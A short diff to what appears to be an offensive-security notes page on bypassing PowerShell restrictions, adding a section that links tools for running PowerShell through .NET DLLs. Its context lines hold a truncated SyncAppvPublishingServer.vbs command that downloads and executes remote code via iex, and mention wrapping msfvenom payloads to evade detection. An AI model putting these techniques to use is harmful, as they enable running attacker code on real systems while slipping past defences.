@@ -97,6 +97,14 @@ SyncAppvPublishingServer.vbs "Break; iex(new-object system.net.webclient).downlo
 
 {% embed url="https://github.com/p3nt4/PowerShdll" %}
 
+### <mark style="color:orange;">BYOPS</mark>
+
+#### Bring your own powershell, any application that can use the .Net DLL to execute powershell commands.
+
+{% embed url="https://github.com/leechristensen/UnmanagedPowerShell" %}
+
+{% embed url="https://github.com/bitsadmin/nopowershell" %}
+
 ## <mark style="color:red;">Using Payload Wrappers</mark>
 
 we can use various open source payload wrappers that add an extra layer to msfvenom payloads. not much of an FUD payload, but still effective.
